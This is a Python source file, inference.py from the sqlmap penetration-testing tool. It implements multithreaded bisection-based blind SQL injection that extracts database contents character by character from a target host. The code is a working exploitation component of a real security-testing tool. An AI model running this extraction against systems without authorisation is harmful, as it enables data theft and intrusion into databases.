#!/usr/bin/env python

"""
$Id: inference.py 2403 2010-11-17 22:00:09Z inquisb $

Copyright (c) 2006-2010 sqlmap developers (http://sqlmap.sourceforge.net/)
See the file 'doc/COPYING' for copying permission
"""

import threading
import time
import traceback

from lib.core.agent import agent
from lib.core.common import dataToSessionFile
from lib.core.common import dataToStdout
from lib.core.common import getCharset
from lib.core.common import goGoodSamaritan
from lib.core.common import getPartRun
from lib.core.common import popValue
from lib.core.common import pushValue
from lib.core.common import readInput
from lib.core.common import replaceNewlineTabs
from lib.core.common import safeStringFormat
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.enums import DBMS
from lib.core.exception import sqlmapConnectionException
from lib.core.exception import sqlmapValueException
from lib.core.exception import sqlmapThreadException
from lib.core.exception import unhandledException
from lib.core.progress import ProgressBar
from lib.core.unescaper import unescaper
from lib.request.connect import Connect as Request

def bisection(payload, expression, length=None, charsetType=None, firstChar=None, lastChar=None):
    """
    Bisection algorithm that can be used to perform blind SQL injection
    on an affected host
    """

    partialValue = ""
    finalValue = ""
    asciiTbl = getCharset(charsetType)

    # Set kb.partRun in case "common prediction" feature (a.k.a. "good
    # samaritan") is used
    kb.partRun = getPartRun() if conf.predictOutput else None

    if "LENGTH(" in expression or "LEN(" in expression:
        firstChar = 0
    elif conf.firstChar is not None and ( isinstance(conf.firstChar, int) or ( isinstance(conf.firstChar, basestring) and conf.firstChar.isdigit() ) ):
        firstChar = int(conf.firstChar) - 1
    elif firstChar is None:
        firstChar = 0
    elif ( isinstance(firstChar, basestring) and firstChar.isdigit() ) or isinstance(firstChar, int):
        firstChar = int(firstChar) - 1

    if "LENGTH(" in expression or "LEN(" in expression:
        lastChar = 0
    elif conf.lastChar is not None and ( isinstance(conf.lastChar, int) or ( isinstance(conf.lastChar, basestring) and conf.lastChar.isdigit() ) ):
        lastChar = int(conf.lastChar)
    elif lastChar in ( None, "0" ):
        lastChar = 0
    elif ( isinstance(lastChar, basestring) and lastChar.isdigit() ) or isinstance(lastChar, int):
        lastChar = int(lastChar)

    if kb.dbmsDetected:
        _, _, _, _, _, _, fieldToCastStr = agent.getFields(expression)
        nulledCastedField                = agent.nullAndCastField(fieldToCastStr)
        expressionReplaced               = expression.replace(fieldToCastStr, nulledCastedField, 1)
        expressionUnescaped              = unescaper.unescape(expressionReplaced)
    else:
        expressionUnescaped              = unescaper.unescape(expression)

    debugMsg = "query: %s" % expressionUnescaped
    logger.debug(debugMsg)

    if length and not isinstance(length, int) and length.isdigit():
        length = int(length)

    if length == 0:
        return 0, ""

    if lastChar > 0 and length > ( lastChar - firstChar ):
        length = ( lastChar - firstChar )

    showEta    = conf.eta and isinstance(length, int)
    numThreads = min(conf.threads, length)
    threads    = []

    if showEta:
        progress = ProgressBar(maxValue=length)
        progressTime = []

    if numThreads > 1:
        debugMsg = "starting %d thread%s" % (numThreads, ("s" if numThreads > 1 else ""))
        logger.debug(debugMsg)

    if conf.verbose in (1, 2) and not showEta:
        if isinstance(length, int) and conf.threads > 1:
            dataToStdout("[%s] [INFO] retrieved: %s" % (time.strftime("%X"), "_" * min(length, conf.progressWidth)))
            dataToStdout("\r[%s] [INFO] retrieved: " % time.strftime("%X"))
        else:
            dataToStdout("[%s] [INFO] retrieved: " % time.strftime("%X"))

    queriesCount = [0] # As list to deal with nested scoping rules
    hintlock = threading.Lock()

    def tryHint(idx):
        hintlock.acquire()
        hintValue = kb.hintValue
        hintlock.release()

        if hintValue is not None and len(hintValue) >= idx:
            if kb.dbms in (DBMS.SQLITE, DBMS.ACCESS, DBMS.MAXDB):
                posValue = hintValue[idx-1]
            else:
                posValue = ord(hintValue[idx-1])

            forgedPayload = safeStringFormat(payload.replace('%3E', '%3D'), (expressionUnescaped, idx, posValue))
            queriesCount[0] += 1
            result = Request.queryPage(forgedPayload)

            if result:
                return hintValue[idx-1]

        hintlock.acquire()
        kb.hintValue = None
        hintlock.release()

        return None

    def getChar(idx, charTbl=asciiTbl, continuousOrder=True, expand=charsetType is None):
        """
        continuousOrder means that distance between each two neighbour's
        numerical values is exactly 1
        """
        
        result = tryHint(idx)

        if result:
            return result

        if not continuousOrder:
            originalTbl = list(charTbl)
        else:
            # Used for gradual expanding into unicode charspace
            shiftTable = [5, 4]

        if len(charTbl) == 1:
            forgedPayload = safeStringFormat(payload.replace('%3E', '%3D'), (expressionUnescaped, idx, charTbl[0]))
            queriesCount[0] += 1
            result = Request.queryPage(forgedPayload)

            if result:
                return chr(charTbl[0]) if charTbl[0] < 128 else unichr(charTbl[0])
            else: 
                return None

        maxChar = maxValue = charTbl[-1]
        minChar = minValue = charTbl[0]

        while len(charTbl) != 1:
            position = (len(charTbl) >> 1)
            posValue = charTbl[position]

            if kb.dbms in (DBMS.SQLITE, DBMS.MAXDB):
                pushValue(posValue)
                posValue = chr(posValue) if posValue < 128 else unichr(posValue)

            forgedPayload = safeStringFormat(payload, (expressionUnescaped, idx, posValue))

            queriesCount[0] += 1
            result = Request.queryPage(forgedPayload)

            if kb.dbms in (DBMS.SQLITE, DBMS.MAXDB):
                posValue = popValue()

            if result:
                minValue = posValue

                if type(charTbl) != xrange:
                    charTbl = charTbl[position:]
                else:
                    # xrange() - extended virtual charset used for memory/space optimization
                    charTbl = xrange(charTbl[position], charTbl[-1] + 1)
            else:
                maxValue = posValue

                if type(charTbl) != xrange:
                    charTbl = charTbl[:position]
                else:
                    charTbl = xrange(charTbl[0], charTbl[position])

            if len(charTbl) == 1:
                if continuousOrder:
                    if maxValue == 1:
                        return None

                    # Going beyond the original charset
                    elif minValue == maxChar:
                        # If the original charTbl was [0,..,127] new one
                        # will be [128,..,128*16-1] or from 128 to 2047
                        # and instead of making a HUGE list with all the
                        # elements we use a xrange, which is a virtual
                        # list
                        if expand and shiftTable:
                            charTbl = xrange(maxChar + 1, (maxChar + 1) << shiftTable.pop())
                            maxChar = maxValue = charTbl[-1]
                            minChar = minValue = charTbl[0]
                        else:
                            return None
                    else:
                        retVal = minValue + 1
                        return chr(retVal) if retVal < 128 else unichr(retVal)
                else:
                    if minValue == maxChar or maxValue == minChar:
                        return None

                    # If we are working with non-continuous elements, set
                    # both minValue and character afterwards are possible
                    # candidates
                    for retVal in (originalTbl[originalTbl.index(minValue)], originalTbl[originalTbl.index(minValue) + 1]):
                        forgedPayload = safeStringFormat(payload.replace('%3E', '%3D'), (expressionUnescaped, idx, retVal))
                        queriesCount[0] += 1
                        result = Request.queryPage(forgedPayload)

                        if result:
                            return chr(retVal) if retVal < 128 else unichr(retVal)

                    return None

    def etaProgressUpdate(charTime, index):
        if len(progressTime) <= ( (length * 3) / 100 ):
            eta = 0
        else:
            midTime = sum(progressTime) / len(progressTime)
            midTimeWithLatest = (midTime + charTime) / 2
            eta = midTimeWithLatest * (length - index) / conf.threads

        progressTime.append(charTime)
        progress.update(index)
        progress.draw(eta)

    # Go multi-threading (--threads > 1)
    if conf.threads > 1 and isinstance(length, int) and length > 1:
        value   = [ None ] * length
        index   = [ firstChar ]    # As list for python nested function scoping
        idxlock = threading.Lock()
        iolock  = threading.Lock()
        valuelock  = threading.Lock()
        kb.locks.seqLock = threading.Lock()
        conf.threadContinue = True

        def downloadThread():
            try:
                while conf.threadContinue:
                    idxlock.acquire()

                    if index[0] >= length:
                        idxlock.release()

                        return

                    index[0] += 1
                    curidx = index[0]
                    idxlock.release()

                    if conf.threadContinue:
                        charStart = time.time()
                        val = getChar(curidx)

                        if val is None:
                            if not kb.assumeEmpty:
                                iolock.acquire()

                                warnMsg = "failed to get character at index %d (expected %d total)." % (curidx, length)
                                logger.warn(warnMsg)

                                message = "assume empty character? [Y/n/a]"
                                choice = readInput(message, default="Y")
                                iolock.release()

                                if choice in ("a", "A"):
                                    kb.assumeEmpty = True
                                elif not choice or choice in ("y", "Y"):
                                    pass # do nothing
                                else:
                                    raise sqlmapValueException

                            val = ''
                    else:
                        break

                    valuelock.acquire()
                    value[curidx-1] = val
                    currentValue = list(value)
                    valuelock.release()

                    if conf.threadContinue:
                        if showEta:
                            etaProgressUpdate(time.time() - charStart, index[0])
                        elif conf.verbose >= 1:
                            startCharIndex = 0
                            endCharIndex = 0

                            for i in xrange(length):
                                if currentValue[i] is not None:
                                    endCharIndex = max(endCharIndex, i)

                            output = ''

                            if endCharIndex > conf.progressWidth:
                                startCharIndex = endCharIndex - conf.progressWidth

                            count = 0

                            for i in xrange(startCharIndex, endCharIndex + 1):
                                output += '_' if currentValue[i] is None else currentValue[i]

                            for i in xrange(length):
                                count += 1 if currentValue[i] is not None else 0

                            if startCharIndex > 0:
                                output = '..' + output[2:]

                            if (endCharIndex - startCharIndex == conf.progressWidth) and (endCharIndex < length-1):
                                output = output[:-2] + '..'

                            output += '_' * (min(length, conf.progressWidth) - len(output))
                            status = ' %d/%d (%d%s)' % (count, length, round(100.0*count/length), '%')
                            output += status if count != length else " "*len(status)

                            iolock.acquire()
                            dataToStdout("\r[%s] [INFO] retrieved: %s" % (time.strftime("%X"), replaceNewlineTabs(output, stdout=True)))
                            iolock.release()

                if not conf.threadContinue:
                    if int(threading.currentThread().getName()) == numThreads - 1:
                        partialValue = unicode()
                        for v in value:
                            if v is None:
                                break
                            elif isinstance(v, basestring):
                                partialValue += v

                        if len(partialValue) > 0:
                            dataToSessionFile(replaceNewlineTabs(partialValue))

            except (sqlmapConnectionException, sqlmapValueException), errMsg:
                print
                conf.threadException = True
                logger.error("thread %d: %s" % (numThread + 1, errMsg))

            except KeyboardInterrupt:
                conf.threadException = True

                print
                logger.debug("waiting for threads to finish")

                try:
                    while (threading.activeCount() > 1):
                        pass

                except KeyboardInterrupt:
                    raise sqlmapThreadException, "user aborted"

            except:
                print
                conf.threadException = True
                errMsg = unhandledException()
                logger.error("thread %d: %s" % (numThread + 1, errMsg))
                traceback.print_exc()

        # Start the threads
        for numThread in range(numThreads):
            thread = threading.Thread(target=downloadThread, name=str(numThread))
            thread.start()
            threads.append(thread)

        # And wait for them to all finish
        try:
            alive = True
            while alive:
                alive = False
                for thread in threads:
                    if thread.isAlive():
                        alive = True
                        thread.join(5)
        except KeyboardInterrupt:
            conf.threadContinue = False
            raise

        infoMsg = None

        # If we have got one single character not correctly fetched it
        # can mean that the connection to the target url was lost
        if None in value:
            for v in value:
                if isinstance(v, basestring) and v is not None:
                    partialValue += v

            if partialValue:
                finalValue = partialValue
                infoMsg = "\r[%s] [INFO] partially retrieved: %s" % (time.strftime("%X"), finalValue)
        else:
            finalValue = "".join(value)
            infoMsg = "\r[%s] [INFO] retrieved: %s" % (time.strftime("%X"), finalValue)

        if isinstance(finalValue, basestring) and len(finalValue) > 0:
            dataToSessionFile(replaceNewlineTabs(finalValue))

        if conf.verbose in (1, 2) and not showEta and infoMsg:
            dataToStdout(infoMsg)

        kb.locks.seqLock = None

    # No multi-threading (--threads = 1)
    else:
        index = firstChar

        while True:
            index += 1
            charStart = time.time()

            # Common prediction feature (a.k.a. "good samaritan")
            # NOTE: to be used only when multi-threading is not set for
            # the moment
            if conf.predictOutput and len(finalValue) > 0 and kb.partRun is not None:
                val = None
                commonValue, commonPattern, commonCharset, otherCharset = goGoodSamaritan(finalValue, asciiTbl)

                # Debug print
                #print "\ncommonValue, commonPattern, commonCharset:", commonValue, commonPattern, commonCharset

                # If there is one single output in common-outputs, check
                # it via equal against the query output
                if commonValue is not None:
                    # One-shot query containing equals commonValue
                    testValue = unescaper.unescape("'%s'" % commonValue) if "'" not in commonValue else unescaper.unescape("%s" % commonValue, quote=False)
                    query = agent.prefixQuery(safeStringFormat("AND (%s) = %s", (expressionUnescaped, testValue)))
                    query = agent.suffixQuery(query)
                    queriesCount[0] += 1
                    result = Request.queryPage(agent.payload(newValue=query))

                    # Did we have luck?
                    if result:
                        dataToSessionFile(replaceNewlineTabs(commonValue[index-1:]))

                        if showEta:
                            etaProgressUpdate(time.time() - charStart, len(commonValue))
                        elif conf.verbose in (1, 2):
                            dataToStdout(commonValue[index-1:])

                        finalValue = commonValue

                        break

                # If there is a common pattern starting with finalValue,
                # check it via equal against the substring-query output
                if commonPattern is not None:
                    # Substring-query containing equals commonPattern
                    subquery = queries[kb.dbms].substring.query % (expressionUnescaped, 1, len(commonPattern))
                    testValue = unescaper.unescape("'%s'" % commonPattern) if "'" not in commonPattern else unescaper.unescape("%s" % commonPattern, quote=False)
                    query = agent.prefixQuery(safeStringFormat("AND (%s) = %s", (subquery, testValue)))
                    query = agent.suffixQuery(query)
                    queriesCount[0] += 1
                    result = Request.queryPage(agent.payload(newValue=query))

                    # Did we have luck?
                    if result:
                        val = commonPattern[index-1:]
                        index += len(val)-1

                # Otherwise if there is no commonValue (single match from
                # txt/common-outputs.txt) and no commonPattern
                # (common pattern) use the returned common charset only
                # to retrieve the query output
                if not val and commonCharset:
                    val = getChar(index, commonCharset, False)

                # If we had no luck with commonValue and common charset,
                # use the returned other charset
                if not val:
                    val = getChar(index, otherCharset, otherCharset == asciiTbl)
            else:
                val = getChar(index, asciiTbl)

            if val is None or ( lastChar > 0 and index > lastChar ):
                break

            if kb.data.processChar:
                val = kb.data.processChar(val)

            finalValue += val
            dataToSessionFile(replaceNewlineTabs(val))

            if showEta:
                etaProgressUpdate(time.time() - charStart, index)
            elif conf.verbose in (1, 2):
                dataToStdout(val)

    if conf.verbose in (1, 2) or showEta:
        dataToStdout("\n")

    if ( conf.verbose in ( 1, 2 ) and showEta ) or conf.verbose >= 3:
        infoMsg = "retrieved: %s" % finalValue
        logger.info(infoMsg)

    if not partialValue:
        dataToSessionFile("]\n")

    if conf.threadException:
        raise sqlmapThreadException, "something unexpected happened inside the threads"

    return queriesCount[0], finalValue
